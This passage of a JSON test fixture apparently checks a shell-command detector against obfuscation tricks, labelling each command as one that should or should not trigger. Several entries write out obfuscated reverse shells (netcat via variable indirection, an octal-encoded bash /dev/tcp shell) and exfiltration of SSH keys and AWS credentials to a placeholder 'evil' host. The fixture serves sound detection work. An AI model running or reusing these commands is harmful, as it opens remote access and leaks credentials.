    "target_signal": "c2.reverse_shell",
    "should_fire": true,
    "rationale": "Octal printf escapes spell 'bash -i >& /dev/tcp/1/9' in place; octal unescape reveals it."
  },
  {
    "command": "A=n;B=c;C=$A$B;$C -e /bin/sh 5.5.5.5 9",
    "target_signal": "c2.reverse_shell",
    "should_fire": true,
    "rationale": "var-of-var C=$A$B resolves to 'nc'; chained indirection must build the 'nc -e' reverse shell."
  },
  {
    "command": "scp$IFS$9~/.ssh/id_rsa$IFS$9evil:/tmp",
    "target_signal": "egress.network_tool",
    "should_fire": true,
    "rationale": "$IFS$9 separators glue scp to its args; stripping $IFS exposes the scp egress tool (and .ssh path)."
  },
  {
    "command": "w\"g\"e\"t\" --post-file=~/.aws/credentials http://evil/x",
    "target_signal": "egress.network_tool",
    "should_fire": true,
    "rationale": "Quote noise w\"g\"e\"t\" collapses to 'wget', exposing the egress tool exfiltrating .aws/credentials."
  },
  {
    "command": "D=keys;cp config/$D/public.pem build/",
    "target_signal": "cred.read.ssh",
    "should_fire": false,
    "rationale": "Var expands to a benign project 'config/keys/public.pem' path; no .ssh/ or id_rsa token exists."
  },
  {
    "command": "echo U2VlIGRvY3Mgc2VjdGlvbiA0IGZvciBzZXR1cCBzdGVwcw== | base64 -d",
    "target_signal": "cred.read.ssh",
    "should_fire": false,
    "rationale": "base64 decodes to plain prose ('See docs section 4...'), a legit data pipeline with no SSH path."
  },
  {
    "command": "resolved \"https://r/foo\" integrity sha512-KCwtLi8wMTIzNDU2Nzg5Ojs8PT4/QEFCQ0RFRkdISUpLTE1OT1BRUlNUVVZX",
    "target_signal": "egress.network_tool",
    "should_fire": false,
    "rationale": "Yarn lockfile sha512 base64 integrity blob decodes to binary junk; junk filter rejects it, no curl/wget forged."
  },
  {
    "command": "printf \"loaded %s credentials\\n\" \"$COUNT\"",
    "target_signal": "cred.read.aws",
    "should_fire": false,
    "rationale": "printf %s format with no \\x escapes and the word 'credentials' as prose; no .aws/ path token."
  },
  {
    "command": "git checkout 8c2f1a9b3d4e5f60718293a4b5c6d7e8f9012345",
    "target_signal": "c2.reverse_shell",
    "should_fire": false,
    "rationale": "A 40-char git SHA is a long-hex lookalike, but it decodes to opaque bytes rejected by the junk filter."
  },
  {
    "command": "tar -czf ~/backup.tgz $HOME/project",
    "target_signal": "cred.read.ssh",
    "should_fire": false,
    "rationale": "Legit $HOME env var in a backup; expansion yields a normal home path, no .ssh/ or id_rsa."
  },
  {
    "command": "echo eyJrZXkiOiJ2YWx1ZSJ9 | base64 -d > data.json",
    "target_signal": "cred.read.dotenv",
    "should_fire": false,
    "rationale": "base64 of a benign JSON object piped to a data file; no .env/.pem/.netrc token after decode."
  },
  {
    "command": "make build > /dev/null 2>&1",
    "target_signal": "c2.reverse_shell",
    "should_fire": false,
    "rationale": "/dev/null redirect is a build lookalike for /dev/tcp; the reverse-shell regex requires /dev/tcp specifically."
  }
]